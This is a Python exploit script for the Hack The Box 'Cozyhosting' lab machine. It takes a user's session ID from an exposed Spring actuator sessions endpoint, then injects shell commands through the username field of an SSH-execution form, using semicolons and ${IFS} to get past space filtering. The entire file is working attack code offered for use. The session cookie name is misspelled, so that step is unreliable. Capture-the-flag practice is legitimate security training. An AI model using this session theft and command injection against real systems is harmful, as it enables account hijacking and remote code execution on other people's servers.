#!/usr/bin/env python3

'''
HTB Cozyhosting
---------------
Description: Command injection in SSH connection service
Author: Marss
Repository: https://e1p0tr0.github.io/
Date: 18 Oct, 2023
'''

from argparse import ArgumentParser, RawDescriptionHelpFormatter
from json import loads
from requests import get, post
from requests.exceptions import ConnectionError, ConnectTimeout, ReadTimeout
from signal import signal, SIGINT
from sys import argv

# Ctrl + c
signal(SIGINT, lambda signum, frame: exit('\n[!] User aborted.'))

# Main class
class Exploit:

    def __init__(self, args):
        
        self.command = args.command
        self.target = {'base_url':'http://cozyhosting.htb'}
        self.session = {}

    def run(self):
        
        if self.target_response():
            
            self.cookie_theft(user='kanderson')
            self.command_injection()

    def target_response(self) -> bool:

        try:
            response = get(self.target['base_url'], timeout=5)

            if response.ok:
                print('\n[+] Target up.')

            return response.ok

        except ConnectTimeout:
            exit('\n[!] Verify VPN connection.')
        except ConnectionError:
            exit(f'\n[x] Can\'t resolve {self.target["base_url"]}')

    def cookie_theft(self, user):

        try:
            response = get(self.target['base_url'] + '/actuator/sessions')
            
            if response.status_code != 200:
                exit('\n[x] Something went wrong.')
            
            sessions = loads(response.text)
            self.session[user] = [key for key, val in sessions.items() if val == user][0]

        except Exception as error:
            exit('\n[x] Error: ' + repr(error))

    def command_injection(self):

        try:
            cookies = {'JSESISONID':self.session['kanderson']}
            post_data = {
                'host':'1.1.1.1',
                'username': ';' + self.command.replace(' ', '${IFS}') + ';'
            }
            
            response = post(self.target['base_url'] + '/executessh',
                cookies=cookies,
                data=post_data,
                timeout=5)

            print('[+] Command executed')
        
        except ReadTimeout:
            exit('\n[x] Something went wrong.')
        except Exception as error:
            exit('\n[x] Error: ' + repr(error))

# Main flow
if __name__ == '__main__':

    title = '\n| HTB Cozyhosting Command Injection PoC |'

    parser = ArgumentParser(
        formatter_class=RawDescriptionHelpFormatter,
        epilog=f'''Example:
        python3 {argv[0]} -c 'ping -c 1 10.10.10.10'
        ''')

    parser.add_argument('-c', '--command', type=str, required=True, help='Command to probe (not output)')

    args = parser.parse_args()

    print (title)

    exploit = Exploit(args)
    exploit.run()